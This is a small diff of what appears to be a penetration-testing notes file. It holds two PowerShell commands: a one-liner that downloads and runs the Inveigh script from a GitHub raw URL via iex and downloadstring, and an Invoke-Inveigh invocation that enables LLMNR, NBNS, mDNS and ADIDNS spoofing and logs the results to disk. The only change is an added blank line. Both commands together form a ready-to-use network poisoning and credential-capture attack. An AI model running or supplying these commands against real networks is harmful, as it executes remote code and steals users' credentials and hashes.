@@ -1,6 +1,7 @@
 ```
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/sp00ks-git/Inveigh/master/Inveigh.ps1')
 ```
+
 ```
 Invoke-Inveigh -ConsoleOutput Y -StatusOutput Y  -ADIDNS COMBO -NBNS Y -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory "C:\DIRECTORY" -LLMNR Y -mDNS Y
 ```
